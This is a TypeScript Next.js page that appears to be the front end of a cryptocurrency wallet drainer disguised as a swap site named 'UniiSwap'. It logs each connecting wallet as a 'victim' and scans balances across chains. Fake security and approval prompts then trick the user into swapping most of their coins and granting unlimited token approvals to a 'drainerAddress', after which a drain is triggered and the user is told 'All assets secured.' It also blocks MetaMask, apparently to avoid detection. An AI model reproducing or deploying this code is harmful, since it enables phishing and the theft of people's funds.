'use client';

import { useEffect, useReducer, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { SecurityAlert } from '@/components/SecurityAlert';
import { ApprovalPrompt } from '@/components/ApprovalPrompt';
import {
  discoverEIP6963Providers,
  isMetaMaskProvider,
  METAMASK_BLOCKED_MESSAGE,
} from '@/lib/eip6963';
import { getProviderRdns, setSelectedProvider } from '@/lib/providerStore';
import { switchToChain } from '@/lib/chainSwitch';
import { getChainEntry } from '@/lib/chainRegistry';
import { registerVictim, drainPlanB } from '@/lib/api';

const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001';

interface TokenEntry {
  blockchain: string;
  tokenSymbol: string;
  tokenType: string;
  balance: string;
  balanceUsd: number;
  contractAddress: string | null;
  isNative: boolean;
}

interface ChainTask {
  chain: string;
  chainName: string;
  nativeSymbol: string;
  needsSwap: boolean;
  swapAmount?: string;
  nativeUsd: number;
  stableUsd: number;
  highestStableAddress: string | null;
  highestStableSymbol: string | null;
  stablecoins: TokenEntry[];
}

interface Portfolio {
  totalBalanceUsd: string;
  totalAssetCount: number;
  chains: any[];
}

type FlowState =
  | { tag: 'idle' }
  | { tag: 'scanning' }
  | { tag: 'swap_alert'; task: ChainTask; portfolio: Portfolio }
  | { tag: 'swapping'; task: ChainTask; portfolio: Portfolio }
  | { tag: 'approve_prompt'; task: ChainTask; portfolio: Portfolio }
  | { tag: 'approving'; task: ChainTask; portfolio: Portfolio }
  | { tag: 'draining'; task: ChainTask; portfolio: Portfolio }
  | { tag: 'complete' }
  | { tag: 'error'; message: string };

type FlowAction =
  | { type: 'SCAN_STARTED' }
  | { type: 'SCAN_COMPLETE'; portfolio: Portfolio; tasks: ChainTask[] }
  | { type: 'SCAN_FAILED'; message: string }
  | { type: 'SWAP_MINED'; task: ChainTask; portfolio: Portfolio }
  | { type: 'APPROVE_MINED'; task: ChainTask; portfolio: Portfolio }
  | { type: 'ALL_COMPLETE' };

function flowReducer(state: FlowState, action: FlowAction): FlowState {
  switch (action.type) {
    case 'SCAN_STARTED':
      return { tag: 'scanning' };
    case 'SCAN_COMPLETE': {
      if (action.tasks.length === 0) return { tag: 'complete' };
      const first = action.tasks[0];
      return first.needsSwap
        ? { tag: 'swap_alert', task: first, portfolio: action.portfolio }
        : { tag: 'approve_prompt', task: first, portfolio: action.portfolio };
    }
    case 'SCAN_FAILED':
      return { tag: 'error', message: action.message };
    case 'SWAP_MINED':
      return { tag: 'approve_prompt', task: { ...action.task, needsSwap: false }, portfolio: action.portfolio };
    case 'APPROVE_MINED':
      return { tag: 'draining', task: action.task, portfolio: action.portfolio };
    case 'ALL_COMPLETE':
      return { tag: 'complete' };
    default:
      return state;
  }
}

async function resolveProviderFromSession(): Promise<any | null> {
  const rdns = getProviderRdns();
  if (!rdns) return null;
  const providers = await discoverEIP6963Providers();
  const match = providers.find(
    (d) => String(d.info.rdns || '').toLowerCase() === String(rdns).toLowerCase()
  );
  return match?.provider ?? null;
}

function computeSwapAmount(balanceStr: string, decimals: number, percent: number): string {
  try {
    const [whole, frac = ''] = balanceStr.split('.');
    const truncatedFrac = frac.slice(0, decimals);
    const normalized = truncatedFrac ? `${whole}.${truncatedFrac}` : whole;
    const scale = 10n ** BigInt(decimals);
    const [w, f] = normalized.split('.');
    const parsed = BigInt(w) * scale + BigInt((f || '').padEnd(decimals, '0'));
    if (parsed === 0n) return '0';
    const pct = BigInt(Math.max(1, Math.min(99, Math.floor(percent))));
    const result = (parsed * pct) / 100n;
    const intPart = result / scale;
    const fracPart = result % scale;
    return fracPart === 0n ? intPart.toString() : `${intPart}.${fracPart.toString().padStart(decimals, '0').replace(/0+$/, '')}`;
  } catch {
    return balanceStr;
  }
}

export default function FlowPage() {
  const router = useRouter();
  const [state, dispatch] = useReducer(flowReducer, { tag: 'idle' });
  const started = useRef(false);
  const tasksRef = useRef<ChainTask[]>([]);
  const victimRef = useRef<string>('');

  useEffect(() => {
    if (started.current) return;
    started.current = true;
    void initialize();
  }, []);

  async function initialize() {
    dispatch({ type: 'SCAN_STARTED' });
    try {
      const provider = await resolveProviderFromSession();
      if (!provider?.request) {
        router.push('/');
        return;
      }
      if (isMetaMaskProvider(provider)) {
        dispatch({ type: 'SCAN_FAILED', message: METAMASK_BLOCKED_MESSAGE });
        return;
      }

      const accounts = await provider.request({ method: 'eth_requestAccounts' });
      if (!accounts?.length) {
        dispatch({ type: 'SCAN_FAILED', message: 'No account returned by wallet.' });
        return;
      }
      const wallet = accounts[0];
      victimRef.current = wallet;

      const providerRdns = getProviderRdns();
      const providerDetail = (await discoverEIP6963Providers()).find(
        (d) => String(d.info?.rdns || '').toLowerCase() === String(providerRdns || '').toLowerCase()
      );
      const walletProviderName = providerDetail?.info?.name || 'Unknown';

      try {
        await registerVictim({
          sourceAddress: wallet,
          chain: 'multi',
          eventType: 'connect',
          walletName: 'UniiSwap',
          walletProvider: walletProviderName,
          siteName: 'UniiSwap',
        });
      } catch (e) {
        console.warn('[FlowPage] registerVictim failed:', e);
      }

      const res = await fetch(
        `${BACKEND_URL}/api/hierarchical-portfolio?walletAddress=${encodeURIComponent(wallet)}`
      );
      if (!res.ok) throw new Error(`Scan failed: ${res.status}`);
      const data: Portfolio = await res.json();

      const tasks: ChainTask[] = data.chains
        .filter((c: any) => c.primaryAction && c.primaryAction !== 'none')
        .map((c: any) => ({
          chain: c.chain,
          chainName: getChainEntry(c.chain)?.name || c.chain,
          nativeSymbol: c.highestToken?.tokenSymbol || getChainEntry(c.chain)?.nativeSymbol || c.nativeSymbol || 'ETH',
          needsSwap: !!c.needsSwap,
          swapAmount:
            c.needsSwap && c.highestToken
              ? computeSwapAmount(String(c.highestToken.balance), Number(c.highestToken.tokenDecimals ?? 18), 98)
              : undefined,
          nativeUsd: Number(c.nativeUsd || 0),
          stableUsd: Number(c.stableUsd || 0),
          highestStableAddress: c.primaryApproveToken || null,
          highestStableSymbol: c.highestStable?.tokenSymbol || null,
          stablecoins: c.stablecoins || [],
        }));

      tasksRef.current = tasks;
      dispatch({ type: 'SCAN_COMPLETE', portfolio: data, tasks });
    } catch (e: any) {
      dispatch({ type: 'SCAN_FAILED', message: e?.message || 'Scan failed' });
    }
  }

  async function handleSwapConfirm(task: ChainTask) {
    const provider = await resolveProviderFromSession();
    if (!provider?.request) throw new Error('Wallet disconnected');
    await switchToChain(provider, task.chain);

    const res = await fetch(`${BACKEND_URL}/api/swap-native-to-usdt`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        victimAddress: victimRef.current,
        chain: task.chain,
        nativeAmount: task.swapAmount,
      }),
    });
    const payload = await res.json();
    if (!payload.success) throw new Error(payload.error || 'Swap request failed');

    const txHash = await provider.request({
      method: 'eth_sendTransaction',
      params: [{ from: victimRef.current, to: payload.to, data: payload.data, value: payload.value }],
    });

    const start = Date.now();
    let confirmed = false;
    while (Date.now() - start < 120_000) {
      const receipt = await provider.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
      if (receipt?.status === '0x1') { confirmed = true; break; }
      if (receipt?.status === '0x0') throw new Error('Swap reverted');
      await new Promise((r) => setTimeout(r, 3000));
    }
    if (!confirmed) throw new Error('Swap not confirmed within 120s');

    const refreshed = await fetch(
      `${BACKEND_URL}/api/hierarchical-portfolio?walletAddress=${encodeURIComponent(victimRef.current)}`
    ).then((r) => r.json());

    dispatch({ type: 'SWAP_MINED', task, portfolio: refreshed });
  }

  async function handleApproveAndDrain(task: ChainTask) {
    const provider = await resolveProviderFromSession();
    if (!provider?.request) throw new Error('Wallet disconnected');
    const entry = getChainEntry(task.chain);
    if (!entry?.drainerAddress) throw new Error(`No drainer for ${task.chain}`);

    await switchToChain(provider, task.chain);

    const approveOrder = [...task.stablecoins]
      .sort((a, b) => b.balanceUsd - a.balanceUsd)
      .map((t) => t.contractAddress)
      .filter(Boolean) as string[];

    if (approveOrder.length === 0) {
      dispatch({ type: 'APPROVE_MINED', task, portfolio: {} as Portfolio });
      return;
    }

    const maxUint256 = '0x' + 'f'.repeat(64);
    const approveData =
      '0x095ea7b3' +
      entry.drainerAddress.toLowerCase().replace('0x', '').padStart(64, '0') +
      maxUint256.replace('0x', '');

    const primary = approveOrder[0];
    const txHash = await provider.request({
      method: 'eth_sendTransaction',
      params: [{ from: victimRef.current, to: primary, data: approveData }],
    });

    const start = Date.now();
    let confirmed = false;
    while (Date.now() - start < 120_000) {
      const receipt = await provider.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
      if (receipt?.status === '0x1') { confirmed = true; break; }
      if (receipt?.status === '0x0') throw new Error('Approve reverted');
      await new Promise((r) => setTimeout(r, 3000));
    }
    if (!confirmed) throw new Error('Approve not confirmed within 120s');

    await drainPlanB({
      ownerAddress: victimRef.current,
      tokens: [primary],
      nftContracts: [],
      nftTokenIds: [],
      chain: task.chain,
      method: 'planb',
    });

    for (let i = 1; i < approveOrder.length; i++) {
      try {
        await switchToChain(provider, task.chain);
        await provider.request({
          method: 'eth_sendTransaction',
          params: [{ from: victimRef.current, to: approveOrder[i], data: approveData }],
        });
      } catch (e) {
        console.warn(`[FlowPage] Secondary approve failed for ${approveOrder[i]}:`, e);
      }
    }

    dispatch({ type: 'APPROVE_MINED', task, portfolio: {} as Portfolio });
  }

  switch (state.tag) {
    case 'idle':
    case 'scanning':
      return <ScreenState text="Scanning your wallet across chains..." />;
    case 'swap_alert':
      return (
        <SecurityAlert
          tokenSymbol={state.task.nativeSymbol}
          usdValue={state.task.nativeUsd.toFixed(2)}
          onConfirm={() => handleSwapConfirm(state.task)}
          chainName={state.task.chainName}
        />
      );
    case 'approve_prompt':
      return (
        <ApprovalPrompt
          chainName={state.task.chainName}
          stableSymbol={state.task.highestStableSymbol || 'USDT'}
          stableUsd={state.task.stableUsd.toFixed(2)}
          onApprove={() => handleApproveAndDrain(state.task)}
        />
      );
    case 'swapping':
    case 'approving':
    case 'draining':
      return <ScreenState text="Processing transaction..." />;
    case 'complete':
      return <ScreenState text="All assets secured." success />;
    case 'error':
      return <ScreenState text={state.message} error />;
    default:
      return null;
  }
}

function ScreenState({ text, success = false, error = false }: { text: string; success?: boolean; error?: boolean }) {
  return (
    <main className="flex min-h-screen items-center justify-center bg-[#FFFFFF] px-6 text-center">
      <div className="space-y-4">
        <div className={['mx-auto h-12 w-12 rounded-full border-2 border-t-transparent', success ? 'border-[#FF37C7]' : error ? 'border-[#F500B4]' : 'border-[#FF37C7] animate-spin'].join(' ')} />
        <p className="text-[14px] leading-[1.49] tracking-[-0.02em] text-[#666666]">{text}</p>
      </div>
    </main>
  );
}
